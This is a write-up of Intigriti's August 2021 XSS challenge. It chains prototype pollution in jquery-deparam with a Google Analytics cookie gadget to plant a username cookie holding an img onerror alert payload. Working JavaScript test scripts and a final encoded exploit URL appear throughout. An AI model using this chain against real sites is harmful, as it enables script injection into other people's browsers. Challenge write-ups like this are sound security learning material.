# Intigriti's August XSS challenge - by @WHOISbinit


## Target

The challenge is hosted at https://challenge-0821.intigriti.io, and the tweet about it is https://twitter.com/intigriti/status/1427232148835258374.

As stated on the challenge's page, we need to find a way to execute arbitrary JavaScript on the challenge page. However, there are a few rules and information:

```
Rules:

-   This challenge runs from August 16 until August 22, 11:59 PM CET.
-   Out of all correct submissions, we will draw  **six**  winners on Monday, 23rd:
    -   Three randomly drawn correct submissions
    -   Three best write-ups
-   Every winner gets a €50 swag voucher for our  [swag shop](https://swag.intigriti.com/)
-   The winners will be announced on our  [Twitter profile](https://twitter.com/intigriti).
-   For every 100 likes to the  [announcement tweet](https://go.intigriti.com/challenge-tips), we'll add a tip to our  [Discord](https://go.intigriti.com/discord)

The solution...

-   Should work on the latest version of Chrome and FireFox both
-   Should execute  `alert(document.domain)`.
-   Should leverage a cross site scripting vulnerability on this domain.
-   Shouldn't be self-XSS or related to MiTM attacks
-   Should be reported at  [go.intigriti.com/submit-solution](https://go.intigriti.com/submit-solution)
```

(taken from https://challenge-0821.intigriti.io / 2021-08-18 09:00 CET)

Right here we notice, that the usual sentence `Should not use any user interaction` is not included in the rules. So this solution might take user interaction. Additionally intigriti changed the way of handing out hints. They are now published on their discord channel.

## Hints

There were no hints published at the time I solved the challenge. However, I do not like the way of publishing them via discord and not on twitter.

## Inspecting and understanding `index.html`
The index page does not have many information left to be inspected or understood. The main target of the challenge is the included iframe:
```html
<iframe src="challenge/cooking.html" width="100%" height="1000px"></iframe>
```

## Inspecting and understanding `challenge/cooking.html`
Just like the filename, the page is about a cookbook. But it does not store classic recipes about meals but about XSS payloads. The page includes three recipes with their recipes encoded:
```html
<ul>
<li><a href="cooking.html?recipe=dGl0bGU9VGhlJTIwYmFzaWMlMjBYU1MmaW5ncmVkaWVudHMlNUIlNUQ9QSUyMHNjcmlwdCUyMHRhZyZpbmdyZWRpZW50cyU1QiU1RD1Tb21lJTIwamF2YXNjcmlwdCZwYXlsb2FkPSUzQ3NjcmlwdCUzRWFsZXJ0KDEpJTNDL3NjcmlwdCUzRSZzdGVwcyU1QiU1RD1GaW5kJTIwdGFyZ2V0JnN0ZXBzJTVCJTVEPUluamVjdCZzdGVwcyU1QiU1RD1FbmpveQ==">The basic XSS</a></li>
<li><a href="cooking.html?recipe=dGl0bGU9VGhlJTIwU1ZHJmluZ3JlZGllbnRzJTVCJTVEPUFuJTIwU1ZHJTIwdGFnJmluZ3JlZGllbnRzJTVCJTVEPVNvbWUlMjBqYXZhc2NyaXB0JmluZ3JlZGllbnRzJTVCJTVEPVNvbWUlMjBvbmxvYWQlMjBhY3Rpb24mcGF5bG9hZD0lM0NzdmclMjBvbmxvYWQlMjUzRGFsZXJ0KDEpJTNFJnN0ZXBzJTVCJTVEPUZpbmQlMjB0YXJnZXQmc3RlcHMlNUIlNUQ9SW5qZWN0JnN0ZXBzJTVCJTVEPUFMRVJUIQ==">The SVG</a></li>
<li><a href="cooking.html?recipe=dGl0bGU9VGhlJTIwUE9MWUdMT1QmaW5ncmVkaWVudHMlNUIlNUQ9QSUyMGxvdCZpbmdyZWRpZW50cyU1QiU1RD1Tb21lJTIwamF2YXNjcmlwdDolMjBhY3Rpb24maW5ncmVkaWVudHMlNUIlNUQ9U29tZSUyMGNvbW1lbnRzJmluZ3JlZGllbnRzJTVCJTVEPUElMjBzbmVha3klMjBTQ1JJUFQlMjB0YWcmaW5ncmVkaWVudHMlNUIlNUQ9U29tZSUyMGNvbW1lbnRzJmluZ3JlZGllbnRzJTVCJTVEPUFuJTIwaW5ub2N1b3VzJTIwc3ZnJTIwZWxlbWVudCZpbmdyZWRpZW50cyU1QiU1RD1BJTIwdGFuZ2xlZCUyMGV4ZWN1dGlvbiUyMHpvbmUlMjB3cmFwcGVkJTIwaW4lMjBpbnZva2luZyUyMHBhcmVudGhlc2lzISZpbmdyZWRpZW50cyU1QiU1RD1FbmNvZGluZ3MlMjBnYWxvcmUmaW5ncmVkaWVudHMlNUIlNUQ9U29tZSUyMHdlaXJkJTIwY2hhcmFjdGVycyZpbmdyZWRpZW50cyU1QiU1RD1Ub28lMjBtdWNoJTIwdGltZSUyMG9uJTIweW91ciUyMGhhbmRzJnBheWxvYWQ9JTBBamFWYXNDcmlwdDovKi0vKiU2MC8qJTVDJTYwLyonLyolMjIvKiovKC8qJTIwKi9vTmNsaUNrJTI1M0RhbGVydCgpJTIwKS8vJTI1MEQlMjUwQSUyNTBkJTI1MGEvLyUzQy9zdFlsZS8lM0MvdGl0TGUvJTNDL3RlWHRhckVhLyUzQy9zY1JpcHQvLS0hJTNFJTVDeDNjc1ZnLyUzQ3NWZy9vTmxvQWQlMjUzRGFsZXJ0KCkvLyUzRSU1Q3gzZSZzdGVwcyU1QiU1RD1GaW5kJTIwdGFyZ2V0cyZzdGVwcyU1QiU1RD1JbmplY3Qmc3RlcHMlNUIlNUQ9SW5qZWN0JnN0ZXBzJTVCJTVEPUluamVjdCZzdGVwcyU1QiU1RD1JbmplY3Qmc3RlcHMlNUIlNUQ9SW5qZWN0JnN0ZXBzJTVCJTVEPUluamVjdCZzdGVwcyU1QiU1RD1JbmplY3Qmc3RlcHMlNUIlNUQ9SW5qZWN0JnN0ZXBzJTVCJTVEPUFMRVJUISUyMChob3BlZnVsbHkp">The POLYGLOT</a></li>
</ul>
```

When a link is clicked, the recipe, ingredients, payload and steps are filled. These information are probably stored in the encoded parameter.

Going further in the sourcecode, we can find the main JavaScript code, which handles the logic on the page. Let's inspect the JavaScript in small steps:
```js
// Reads a cookie with specified name. Returns null if no such cookie present
function readCookie(name) {
    let nameEQ = name + "=";
    let ca = document.cookie.split(';');
    for (let i=0; i < ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0)===' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}
```
This function reads cookies from the `document.cookie` object. This functions looks a lot like the function shown on https://www.w3schools.com/js/js_cookies.asp and thus we can assume, that it is kinda safe. The function is called with the name of the cookie and returns the corresponding value or `null`.

```js
// As we are a professional company offering XSS recipes, we want to create a nice user experience where the user can have a cool name that is shown on the screen
// Our advisors say that it should be editable through the webinterface but I think our users are smart enough to just edit it in the cookies.
// This way no XSS will ever be possible because you cannot change the cookie unless you do it yourself!
function welcomeUser(username) {
    let welcomeMessage = document.querySelector("#welcome");
    welcomeMessage.innerHTML = `Welcome ${username}`;
}
```
This function displays the given argument `username` in the element with the id `#welcome`. This method is probably used to inject our XSS payload, since this method is annotated with the comment about editing the cookie and additionally and it is using `innerHTML` and not something more safe like `innerText`.


```js
// Function to generate the recipe text.
function generateRecipeText(recipe) {
    let title = document.querySelector("#title");
    let ingredients = document.querySelector("#ingredients");
    let payload = document.querySelector("#payload");
    let steps = document.querySelector("#steps");

    title.innerText = `Recipe: ${recipe.title}`;

    let ingredient_text = '';
    for (let ingredient of recipe.ingredients) {
        ingredient_text += `- ${ingredient}\n`;
    }
    ingredients.innerText = ingredient_text;

    payload.innerText = `Payload: ${recipe.payload}`;

    let steps_text = '';
    for (let step of recipe.steps) {
        steps_text += `- ${step}\n`;
    }
    steps.innerText = steps_text;
}
```
This method is responsible to display the title, ingredients, payload and steps. Since it is using `innerText` to display things, it seems safe and is not vulnerable.

```js
// This thing is called after the page loaded or something. Not too sure...
const handleLoad = () => {
    let username = readCookie('username');
    if (!username) {
        document.cookie = `username=unknownUser${Math.floor(Math.random() * (1000 + 1))};path=/`;
    }

    let recipe = deparam(atob(new URL(location.href).searchParams.get('recipe')));

    ga('create', 'ga_r33l', 'auto');

    welcomeUser(readCookie('username'));
    generateRecipeText(recipe);
    console.log(recipe)
}

window.addEventListener("load", handleLoad);
```
This is the rest of the `main.js`.  What this does:
1. It tries to get the `username` cookie.
2. If the cookie returns `null`, a new `username` cookie will be set. The value of the new cookie is the username `unknownUser` appended with a random number up to 1000. Noticeable here is, that the path of the cookie is also set to the root of the page. If there are not other scripts or logic relying to this, this is not usual and thus might be something we should focus in our way of getting XSS.
3. The `recipe` URL parameter is decoded with Base64 (using `atob`) and then given as an argument to the `deparam` method. We will have a look at `deparam` after inspecting the source of `main.js`.
4. The method `ga` is called with some arguments. `ga` is usually used for Google Analytics. This is also confirmed as the `cooking.html` includes the Google Analytics framework. Intigriti's challenges did not include any analytics code in the past. Thus this might be part of the solution.
5. `welcomeUser(readCookie('username'));` reads the `username` cookie and displays it **unsafe** via `innerHTML`.
6. The next two lines just display and log the recipe.

## Having a look at `deparam`
The `deparam` method comes from the included page: https://rawcdn.githack.com/AceMetrix/jquery-deparam/81428b3939c4cbe488202b5fa823ad661d64fb49/jquery-deparam.js
This points to the most up to date commit, which is 6 years old though, from the repo at https://github.com/AceMetrix/jquery-deparam.
With the example on the repo, we can get a quick understanding how `deparam` works:
```js
var paramStr = 'a[]=4&a[]=5&a[]=6&b[x][]=7&b[y]=8&b[z][]=9&b[z][]=0&b[z][]=true&b[z][]=false&b[z][]=undefined&b[z][]=&c=1';
var paramsObj = {
    a: ['4','5','6'],
    b:{
        x:['7'],
        y:'8',
        z:['9','0','true','false','undefined','']
    },
    c:'1'
};

deparam(paramStr).should.deep.equal(paramsObj);
```
It takes a querystring and parses JavaScript objects from it. This seems like an easy trapdoor for [Prototype Pollution](https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications). I did a quick test, which confirmed, that the library is vulnerable to prototype pollution:
```js
var paramStr = '__proto__[foo]=bar';

deparam(paramStr);
const a={
  "noFoo":"noBar"
};

console.log(`Nice evenings at a ${a.foo}.`)
```
With Prototype Pollution we can set arbitrary keys on all objects used in our application.

## Escalate Prototye Pollution
Luckily there is a repository which contains gadgets, how prototype pollution can be used if certain frameworks are included: https://github.com/BlackFan/client-side-prototype-pollution

As we discovered the challenge is using Google Analytics. Thus we can use the Google Analytics gadget: https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/google-analytics.md

However this does not directly give us the possibility to get XSS, but to inject arbitrary cookies with the following payload:
```
__proto__[cookieName]=COOKIE%3DInjection%3B
```

We can also test this, with a small script:
```js
// Include google analytics as `ga2` object. If we run this at the challenge page
// the `ga` is already initialised and the cookies will not be set again.
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga2');

// pollute every object with the `cookieName` property.
var paramStr = '__proto__[cookieName]=COOKIE%3DInjection%3B';

deparam(paramStr);

ga2('create', 'ga_r33l', 'auto');

console.log(document.cookie); // results in `COOKIE=Injection`
```
This script showed, how we can create cookies using the prototype pollution vulnerability from `deparam` and Google Analytics as a gadget.

## Escalate to XSS
With the knowledge how to set cookies, we should pretty easy get XSS. As we know, the `welcomeUser` method displays the value of the `username` cookie via `innerHTML`. So we just need to set a `username` cookie with our XSS payload and call `welcomeUser`.

Before we try to inject it via the URL parameter, we can test our logic in a small script via the DevTools:

```js
// use the sleep method to ensure Google Analytics is loaded and the gadget sets the cookie.
var sleep = (ms)=>new Promise(resolve=>setTimeout(resolve, ms));
// Include google analytics as `ga2` object. If we run this at the challenge page
// the `ga` is already initialised and the cookies will not be set again.
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga4');
await sleep(500);
// pollute every object with the `cookieName` property.
var paramStr = '__proto__[cookieName]=username%3D%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E%3B';

deparam(paramStr);

ga4('create', 'ga_r334', 'auto');
await sleep(500);

console.log(document.cookie);

var username=readCookie('username');
console.log(`Username: ${username}`);

welcomeUser(username);
```

Unfortunately we can see, that the username resolves to something like `unknownUser873` and not to our XSS payload. The reason for this shows the output of `document.cookie`:
```
username=unknownUser873; _ga=GA1.2.287835296.1629273530; _gid=GA1.2.647630521.1629273530; username=<img src=x onerror=alert(document.domain)>
```
Our payload is at the very end of the `document.cookie` string, but the `readCookie` method finds the previously set username first.
If we inspect the cookies in the DevTools, we can see, that the cookie set from the original script is just a session cookie, but our payload is a cookie with a larger age. So, if the user closes the tab or the browser and reopens the challenge page, the XSS is executed. We can also enforce something with having an own HTML page, where we create multiple tabs. But there is even a better way.

I had a look at the Google Analytics script, trying to understand, why the gadget is working. The code, where `cookieName` is used, looks like this:
```js
, U = T("cookieName", void 0, "_ga")
, W = T("cookieDomain")
, Yb = T("cookiePath", void 0, "/")
, Zb = T("cookieExpires", void 0, 63072E3)
, Hd = T("cookieUpdate", void 0, !0)
, Be = T("cookieFlags", void 0, "")
```
We can see, that `cookieName` is some kind of optional configuration element. If it is not set, the name will resolve to `_ga`. But we can also see, that the `cookiePath` property behaves the same. The `cookiePath` is a bit juicy here, because the cookie from `main.js` set their path to `/`. Maybe the order of the cookies in `document.cookie` changes, if we specify the path to `/challenge/cooking.html`:

```js
// use the sleep method to ensure Google Analytics is loaded and the gadget sets the cookie.
var sleep = (ms)=>new Promise(resolve=>setTimeout(resolve, ms));
// Include google analytics as `ga2` object. If we run this at the challenge page
// the `ga` is already initialised and the cookies will not be set again.
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga4');
await sleep(500);
// pollute every object with the `cookieName` property.
var paramStr = '__proto__[cookieName]=username%3D%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E%3B&__proto__[cookiePath]=%2Fchallenge%2Fcooking.html';

deparam(paramStr);

ga4('create', 'ga_r334', 'auto');
await sleep(500);

console.log(document.cookie);

var username=readCookie('username');
console.log(`Username: ${username}`);

welcomeUser(username);
```
💥 Indeed, the order change. Our payload cookie is now **before** the other username cookie and we got our XSS. To get the real reflected XSS we now need to encode our `paramStr` with Base64 and set it as the `recipe` parameter:
https://challenge-0821.intigriti.io/challenge/cooking.html?recipe=X19wcm90b19fW2Nvb2tpZU5hbWVdPXVzZXJuYW1lJTNEJTNDaW1nJTIwc3JjJTNEeCUyMG9uZXJyb3IlM0RhbGVydCUyOGRvY3VtZW50LmRvbWFpbiUyOSUzRSUzQiZfX3Byb3RvX19bY29va2llUGF0aF09JTJGY2hhbGxlbmdlJTJGY29va2luZy5odG1s

